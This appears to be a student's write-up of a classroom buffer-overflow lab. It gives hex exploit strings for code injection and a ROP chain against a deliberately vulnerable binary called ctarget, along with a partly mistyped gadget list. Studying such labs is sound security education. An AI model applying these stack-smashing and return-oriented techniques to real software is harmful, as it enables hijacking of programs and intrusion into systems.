## Phase I

Using readelf to dump the symtab of ctarget, the address of touch1 is 00000000004017c0. Using gdb's "info frame" to reveal the stack addresses and saved rip's inside get_buf, the starting stack address is 0x5561dca8, which is 8 bytes away from the saved return address, and the current stack pointer is at address 0x5561dc78, meaning that the buffer is 40 bytes in size. Then the correct input should be 40 bytes of whatever followed by the 8 byte address of touch1:

12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 c0 17 40 00 00 00 00 00


## Phase II

touch2 is located at 00000000004017ec. The idea is to change the return address to the beginning of the stack (8 bytes higher than the return address itself) and to place the code there, then add to the stack pointer beyond the injected code and execute a return to touch2:

~~~assembly
mov	$0x59b997fa, %edi
add	$0x10, %rsp
ret
~~~

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40


## Phase III 

touch3 is at 00000000004018fa or 


touch3: 4018fa: fa 18 40 00 00 00 00 00
cookie (little endian): 00 61 66 37 39 39 62 39 35
string address: 0x5561dca0 (stack frame) - 0x18 (24 bytes) = 0x5561dc88
first return: 0x5561dc78: 78 dc 61 55 00 00 00 00

1:  bf 88 dc 61 55       	mov    $0x5561dc88,%edi
5:	48 83 ec 10          	sub    $0x10,%rsp
9:	c3    

First attempt:

bf 88 dc 61 55 48 83 ec 10 c3 00 00 00 00 00 00 00 61 66 37 39 39 62 39 35 00 00 00 00 00 00 00 fa 18 40 00 00 00 00 00 78 dc 61 55 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00


The idea was to store the string immediately before the second return target (touch3 code) which comes before the first return target (the injection code) placed at the beginning of the buffer. It failed to overwriting the stack by hex_match


Second attempt, success:

00 61 66 37 39 39 62 39 35 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 18 40 00 00 00 00 00 a8 dc 61 55 00 00 00 00 bf 78 dc 61 55 48 83 ec 10 c3 00 00 00 00 00 00 fa 18 40 00 00 00 00 00


I placed the string code at the top of the stack while placing the first and second return addresses at the very last portion of the code

## Phase IV

The exploit pops rax with the literal hexadecimal for cookie, then does a mov rax, rdi instruction before jumping into the function.

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00

~~~assembly

/* gadgets found */
4019a2: movq rax, rbx
401a06: movq rsp, rax
401a3c: movl esp, eax  

401a94: andb, al,al     
401aa8 andb dl, dl
4019f3: andb bl,bl

401900: testb al,al
401a44: testb al,al

401a29: cmpb: al, al
401a36: cmpb cl,cl  

401a0e: orb cl, cl
401a30: orb bl,bl 
401a451: orb dl,dl
401a6b: orb bl, bl
40180: orb cl,cl

40199e: nop
4019ac: nop
4019c8: nop
4019df: nop
4019e6: nop
401a16: nop
401ab0 :nop

4019cc: popq rax
~~~
* break at 0x401f1f
* break at 0x401971
